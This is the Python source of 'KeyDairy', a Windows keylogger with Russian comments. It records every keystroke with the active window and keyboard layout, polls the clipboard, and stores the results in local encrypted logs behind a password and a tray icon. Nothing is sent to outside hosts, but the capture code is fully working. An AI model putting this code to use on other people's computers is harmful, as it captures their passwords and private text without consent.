
import os
import sys
import datetime
import threading
import base64
import json
import ctypes
import tkinter as tk
from tkinter import messagebox, simpledialog, ttk
from pathlib import Path
import psutil
import win32process
import win32gui
import win32api
import pystray
import win32clipboard
import win32con
from PIL import Image, ImageDraw
from pynput import keyboard
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

# Импорт GUI для просмотра логов
from log_viewer import LogViewer
from encryption_utils import EncryptionManager

class AdvancedKeylogger:
    def __init__(self):
        self.script_dir = Path(__file__).parent
        self.log_dir = self.script_dir / "logs"
        self.config_file = self.script_dir / "config.json"
        self.log_dir.mkdir(exist_ok=True)

        self.current_keys = []
        self.last_window_title = ""
        self.encryption_manager = None
        self.is_recording = False
        self.locked_until = None
        self.clipboard_stop_event = threading.Event()
        self.last_clipboard = None
        self.locked_until = None

        # Проверяем первый запуск: создаём пароль и сохраняем DPAPI-ключ
        if self.is_first_run():
            self.setup_password()
        else:
            # Пытаемся загрузить ключ без запроса пароля через DPAPI
            try:
                self.encryption_manager = EncryptionManager.from_dpapi(self.config_file)
            except Exception:
                # Если не удалось — просим пароль и восстанавливаем конфиг
                self.authenticate()

        # Всегда записывать: запускаем keylogger после настройки/аутентификации
        try:
            self.is_recording = True
            self.keylogger_thread = threading.Thread(target=self.start_keylogger, daemon=True)
            self.keylogger_thread.start()
            # Запускаем монитор буфера обмена
            try:
                self.clipboard_thread = threading.Thread(target=self._monitor_clipboard, daemon=True)
                self.clipboard_stop_event.clear()
                self.clipboard_thread.start()
            except Exception:
                pass
        except Exception:
            # Не критично, запись может быть запущена позже через меню
            self.is_recording = False

    def is_first_run(self):
        """Проверяет, является ли это первым запуском"""
        return not self.config_file.exists()

    def setup_password(self):
        """Настройка пароля при первом запуске"""
        root = tk.Tk()
        root.withdraw()

        # Показываем предупреждение
        messagebox.showwarning(
            "ВНИМАНИЕ!", 
            "ВАЖНО! Запомните ваш пароль!\n\n"
            "Восстановление пароля НЕВОЗМОЖНО.\n"
            "Потеря пароля означает потерю доступа ко всем данным.\n\n"
            "Убедитесь, что вы надежно сохранили пароль!"
        )

        while True:
            password = simpledialog.askstring(
                "Первый запуск", 
                "Создайте надежный пароль для защиты данных:", 
                show='*'
            )

            if not password:
                if messagebox.askyesno("Выход", "Выйти без создания пароля?"):
                    sys.exit(0)
                continue

            if len(password) < 6:
                messagebox.showerror("Ошибка", "Пароль должен содержать минимум 6 символов!")
                continue

            confirm_password = simpledialog.askstring(
                "Подтверждение", 
                "Повторите пароль:", 
                show='*'
            )

            if password != confirm_password:
                messagebox.showerror("Ошибка", "Пароли не совпадают!")
                continue

            # Генерируем новый DEK и сохраняем конфиг (обёртки паролем и DPAPI)
            self.encryption_manager = EncryptionManager.create_new(password, self.config_file)

            messagebox.showinfo("Успех", "Пароль успешно установлен!\nТеперь запустится кейлогер.")
            break

        root.destroy()

    def authenticate(self):
        """Аутентификация пользователя"""
        root = tk.Tk()
        root.withdraw()

        max_attempts = 3
        attempts = 0

        while attempts < max_attempts:
            # Если установлена блокировка — информируем и не даём пробовать
            if self.locked_until and datetime.datetime.now() < self.locked_until:
                remaining = self.locked_until - datetime.datetime.now()
                mins, secs = divmod(int(remaining.total_seconds()), 60)
                messagebox.showerror(
                    "Заблокировано",
                    f"Слишком много неверных попыток. Попробуйте через {mins} минут(ы) {secs} секунд(ы)."
                )
                root.destroy()
                return False

            password = simpledialog.askstring(
                "Авторизация",
                f"Введите пароль (попытка {attempts + 1}/{max_attempts}):",
                show='*'
            )

            if not password:
                if messagebox.askyesno("Выход", "Выйти из приложения?"):
                    sys.exit(0)
                continue

            try:
                # Проверяем пароль на способность расшифровать DEK
                if EncryptionManager(password).verify_password(self.config_file):
                    # Для записи используем менеджер из DPAPI
                    try:
                        self.encryption_manager = EncryptionManager.from_dpapi(self.config_file)
                    except Exception:
                        # В крайнем случае используем менеджер из пароля
                        self.encryption_manager = EncryptionManager.from_password(password, self.config_file)
                    messagebox.showinfo("Успех", "Добро пожаловать в KeyDairy!")
                    root.destroy()
                    return True
                else:
                    attempts += 1
                    if attempts < max_attempts:
                        messagebox.showerror("Ошибка", f"Неверный пароль! Осталось попыток: {max_attempts - attempts}")
                    # Если достигли лимита — ставим таймаут вместо выхода
                    if attempts >= max_attempts:
                        self.locked_until = datetime.datetime.now() + datetime.timedelta(minutes=15)
                        messagebox.showerror(
                            "Заблокировано",
                            "Превышено количество попыток. Доступ заблокирован на 15 минут."
                        )
                        root.destroy()
                        return False
            except Exception as e:
                attempts += 1
                if attempts < max_attempts:
                    messagebox.showerror("Ошибка", f"Ошибка аутентификации! Осталось попыток: {max_attempts - attempts}")
                if attempts >= max_attempts:
                    self.locked_until = datetime.datetime.now() + datetime.timedelta(minutes=15)
                    messagebox.showerror(
                        "Заблокировано",
                        "Превышено количество попыток. Доступ заблокирован на 15 минут."
                    )
                    root.destroy()
                    return False

        root.destroy()
        return False

    def get_active_window_title(self):
        """Получает заголовок активного окна"""
        try:
            hwnd = win32gui.GetForegroundWindow()
            pid = win32process.GetWindowThreadProcessId(hwnd)
            process = psutil.Process(pid[-1])
            window_text = win32gui.GetWindowText(hwnd)
            return f"{process.name()} - {window_text}"
        except Exception:
            return "Unknown"

    def get_keyboard_layout(self):
        """Определяет текущую раскладку (ru/en/hex) для активного потока"""
        try:
            hwnd = win32gui.GetForegroundWindow()
            thread_id = win32process.GetWindowThreadProcessId(hwnd)[0]
            hkl = win32api.GetKeyboardLayout(thread_id)
            lang_id = hkl & 0xffff
            # Набор часто используемых идентификаторов
            mapping = {
                0x0409: 'en',  # English (United States)
                0x0419: 'ru',  # Russian
                0x0809: 'en-uk',
                0x0407: 'de',
                0x040c: 'fr'
            }
            return mapping.get(lang_id, hex(lang_id))
        except Exception:
            return 'unknown'

    def _get_unicode_from_vk(self, vk_code: int) -> str:
        """Преобразует виртуальный код клавиши в Unicode-символ с учётом текущей раскладки и модификаторов.

        Возвращает пустую строку, если символ не печатный или это dead-key.
        """
        try:
            user32 = ctypes.WinDLL('user32', use_last_error=True)

            # Определяем активную раскладку
            hwnd = win32gui.GetForegroundWindow()
            thread_id = win32process.GetWindowThreadProcessId(hwnd)[0]
            hkl = win32api.GetKeyboardLayout(thread_id)

            # Скан-код
            scancode = user32.MapVirtualKeyExW(vk_code, 0, hkl)

            # Состояние модификаторов
            state = (ctypes.c_ubyte * 256)()

            def set_state(vk):
                val = win32api.GetKeyState(vk)
                byte = 0
                if val & 0x8000:
                    byte |= 0x80
                if val & 1:
                    byte |= 0x01
                state[vk] = byte

            for vk in (0x10, 0x11, 0x12, 0x14, 0xA0, 0xA1):  # SHIFT/CTRL/ALT/CAPS/LSHIFT/RSHIFT
                set_state(vk)

            buf = ctypes.create_unicode_buffer(8)
            res = user32.ToUnicodeEx(vk_code, scancode, ctypes.byref(state), buf, len(buf), 0, hkl)

            if res == -1:
                # dead-key, очистим буфер
                user32.ToUnicodeEx(vk_code, scancode, ctypes.byref(state), buf, len(buf), 0, hkl)
                return ''
            if res > 0:
                return buf.value[:res]
            return ''
        except Exception:
            return ''

    def get_encrypted_log_file_path(self):
        """Получает путь к зашифрованному файлу лога"""
        now = datetime.datetime.now()
        year_month_dir = self.log_dir / str(now.year) / now.strftime("%B")
        year_month_dir.mkdir(parents=True, exist_ok=True)
        return year_month_dir / f"{now.day}.enc"

    def write_encrypted_log(self, data, is_header=False):
        """Записывает зашифрованные данные в лог"""
        log_file = self.get_encrypted_log_file_path()

        # Читаем существующий контент если файл существует
        existing_content = ""
        if log_file.exists():
            try:
                existing_content = self.encryption_manager.decrypt_file(log_file)
            except:
                existing_content = ""

        # Добавляем заголовок файла если нужно
        if is_header and not existing_content:
            today = datetime.datetime.now().strftime("%Y-%m-%d")
            existing_content = f"# Журнал клавиатуры за {today}\n\n"

        # Добавляем новые данные
        new_content = existing_content + data

        # Шифруем и сохраняем
        self.encryption_manager.encrypt_to_file(new_content, log_file)

    def on_press(self, key):
        """Обработчик нажатия клавиш"""
        if not self.is_recording:
            return

        window_title = self.get_active_window_title()
        if window_title != self.last_window_title:
            if self.current_keys:
                self.write_encrypted_log("".join(self.current_keys) + "\n\n")
                self.current_keys = []

            timestamp = datetime.datetime.now().strftime('%H:%M:%S')
            layout = self.get_keyboard_layout()
            header = f"\n## [{timestamp}] {window_title} | layout:{layout}\n\n"
            self.write_encrypted_log(header, is_header=True)
            self.last_window_title = window_title


        # Сначала пробуем получить символ через VK и раскладку активного окна.
        # Это даёт более корректные результаты для случаев, когда системная
        # раскладка отличается от раскладки потока слушателя.
        ch_attr = None
        try:
            vk_code = getattr(key, 'vk', None)
            if isinstance(vk_code, int):
                unicode_char = self._get_unicode_from_vk(vk_code)
                if unicode_char:
                    self.current_keys.append(unicode_char)
                    return
        except Exception:
            pass

        # Если VK не дал результата — используем атрибут .char как резервный вариант
        try:
            ch_attr = getattr(key, 'char', None)
            if isinstance(ch_attr, str) and len(ch_attr) >= 1:
                # Добавляем символ напрямую (включая пробелы и перевод строки)
                self.current_keys.append(ch_attr)
                return
        except Exception:
            ch_attr = None

        # Пробуем получить печатный символ по VK и раскладке как резервный метод
        vk_code = getattr(key, 'vk', None)
        char = ''
        if vk_code is None:
            # Если это KeyCode без .vk, пробуем вычислить VK для латинских букв/цифр из .char
            try:
                ch = ch_attr
                if ch and len(ch) == 1:
                    code = ord(ch.upper())
                    if 0x30 <= code <= 0x5A:
                        vk_code = code
            except Exception:
                pass

        if isinstance(vk_code, int):
            char = self._get_unicode_from_vk(vk_code)

        if char:
            self.current_keys.append(char)
            return

        # Если печатный символ получить не удалось — обрабатываем специальные клавиши
        special_key = self.format_special_key(key)
        if special_key in [" ", "\n\n", "    "]:
            self.current_keys.append(special_key)
        else:
            if self.current_keys:
                self.write_encrypted_log("".join(self.current_keys))
                self.current_keys = []
            if special_key not in ["⇧", "Ctrl", "Alt"]:
                self.write_encrypted_log(f" {special_key} ")

    def format_special_key(self, key):
        """Форматирует специальные клавиши"""
        key_map = {
            "space": " ",
            "enter": "\n\n",
            "tab": "    ",
            "backspace": "⌫",
            "shift": "⇧",
            "ctrl_l": "Ctrl",
            "alt_l": "Alt",
            "cmd": "⌘",
            "up": "↑",
            "down": "↓",
            "left": "←",
            "right": "→"
        }
        key_name = str(key).split('.')[-1]
        # Если key_name выглядит как ''a'' или "'a'" (KeyCode), вернём символ без кавычек
        if (len(key_name) >= 2) and ((key_name[0] == "'" and key_name[-1] == "'") or (key_name[0] == '"' and key_name[-1] == '"')):
            return key_name[1:-1]
        return key_map.get(key_name, f"<{key_name}>")

    def start_keylogger(self):
        """Запускает кейлогер"""
        self.is_recording = True
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

    def stop_keylogger(self):
        """Останавливает кейлогер"""
        self.is_recording = False
        # Останавливаем монитор буфера обмена
        try:
            self.clipboard_stop_event.set()
        except Exception:
            pass

    def open_log_viewer(self):
        """Открывает GUI для просмотра логов после проверки пароля"""
        # Проверка блокировки
        if self.locked_until and datetime.datetime.now() < self.locked_until:
            remaining = self.locked_until - datetime.datetime.now()
            mins, secs = divmod(int(remaining.total_seconds()), 60)
            messagebox.showerror(
                "Заблокировано",
                f"Слишком много неверных попыток. Попробуйте через {mins} минут(ы) {secs} секунд(ы)."
            )
            return

        root = tk.Tk()
        root.withdraw()

        max_attempts = 3
        attempts = 0
        while attempts < max_attempts:
            password = simpledialog.askstring(
                "Доступ к журналам",
                f"Введите пароль для просмотра (попытка {attempts + 1}/{max_attempts}):",
                show='*'
            )

            if password is None:
                # Отмена пользователем
                root.destroy()
                return

            try:
                # Получаем менеджер, расшифровав DEK паролем
                viewer_em = EncryptionManager.from_password(password, self.config_file)
                root.destroy()
                viewer = LogViewer(viewer_em, self.log_dir)
                viewer.run()
                return
            except Exception:
                attempts += 1
                if attempts < max_attempts:
                    messagebox.showerror("Ошибка", f"Ошибка проверки. Осталось попыток: {max_attempts - attempts}")
                else:
                    self.locked_until = datetime.datetime.now() + datetime.timedelta(minutes=15)
                    messagebox.showerror(
                        "Заблокировано",
                        "Превышено количество попыток. Доступ заблокирован на 15 минут."
                    )
                    root.destroy()
                    return
        root.destroy()

    def create_tray_icon(self):
        """Создает иконку в системном трее"""
        # Создаем простую иконку: чёрный фон, большие ядовито-зелёные буквы KD
        image = Image.new('RGBA', (64, 64), color=(0, 0, 0, 255))
        draw = ImageDraw.Draw(image)

        try:
            from PIL import ImageFont
            # Большой размер шрифта, чтобы буквы были заметными
            font = ImageFont.truetype("arial.ttf", 36)
        except Exception:
            font = None

        text = "KD"
        text_fill = (0, 255, 64, 255)  # ядовито-зелёный

        if font:
            try:
                bbox = draw.textbbox((0, 0), text, font=font)
                w = bbox[2] - bbox[0]
                h = bbox[3] - bbox[1]
                pos = ((64 - w) // 2, (64 - h) // 2 - 2)
                draw.text(pos, text, fill=text_fill, font=font)
            except Exception:
                draw.text((10, 12), text, fill=text_fill)
        else:
            # Фоллбек: простой рисунок без кастомного шрифта
            draw.text((10, 12), text, fill=text_fill)

        # Создаем меню
        menu = pystray.Menu(
            pystray.MenuItem("Открыть просмотр логов", lambda: self.open_log_viewer()),
            pystray.MenuItem("Остановить запись" if self.is_recording else "Запустить запись", 
                           lambda: self.stop_keylogger() if self.is_recording else self.start_recording()),
            pystray.MenuItem("Выход", self.quit_application)
        )

        # Создаем и запускаем tray icon
        self.tray = pystray.Icon("KeyDairy", image, "KeyDairy - Защищенный кейлогер", menu)

        # Запускаем keylogger в отдельном потоке только если он ещё не запущен
        if not hasattr(self, 'keylogger_thread') or not getattr(self.keylogger_thread, 'is_alive', lambda: False)():
            try:
                self.keylogger_thread = threading.Thread(target=self.start_keylogger, daemon=True)
                # Запускаем поток только если запись включена
                if self.is_recording:
                    self.keylogger_thread.start()
            except Exception:
                pass

        # Запускаем tray в основном потоке
        self.tray.run()

    def start_recording(self):
        """Запускает запись"""
        if not self.is_recording:
            self.is_recording = True
            self.keylogger_thread = threading.Thread(target=self.start_keylogger, daemon=True)
            self.keylogger_thread.start()

    def quit_application(self, icon=None, item=None):
        """Завершает приложение"""
        self.stop_keylogger()
        if hasattr(self, 'tray'):
            self.tray.stop()
        try:
            self.clipboard_stop_event.set()
        except Exception:
            pass
        os._exit(0)

    def _get_clipboard_text(self):
        try:
            win32clipboard.OpenClipboard()
            try:
                data = win32clipboard.GetClipboardData(win32con.CF_UNICODETEXT)
            except Exception:
                data = None
            finally:
                win32clipboard.CloseClipboard()
            return data
        except Exception:
            return None

    def _monitor_clipboard(self):
        """Простой опрос буфера обмена — сохраняет содержимое при изменении"""
        while not self.clipboard_stop_event.is_set():
            try:
                text = self._get_clipboard_text()
                if text and text != self.last_clipboard:
                    self.last_clipboard = text
                    # Формируем запись: время, активная программа, содержимое буфера
                    timestamp = datetime.datetime.now().strftime('%H:%M:%S')
                    program = self.get_active_window_title()
                    entry = f"\n## [{timestamp}] {program} | clipboard\n\n" + text + "\n\n"
                    # Сохраняем зашифрованно
                    try:
                        self.write_encrypted_log(entry)
                        # Для заголовка выделяем как clipboard (не перезаписываем existing header)
                    except Exception:
                        pass
            except Exception:
                pass
            # Пауза между опросами
            self.clipboard_stop_event.wait(timeout=1.5)

if __name__ == "__main__":
    app = AdvancedKeylogger()
    app.create_tray_icon()
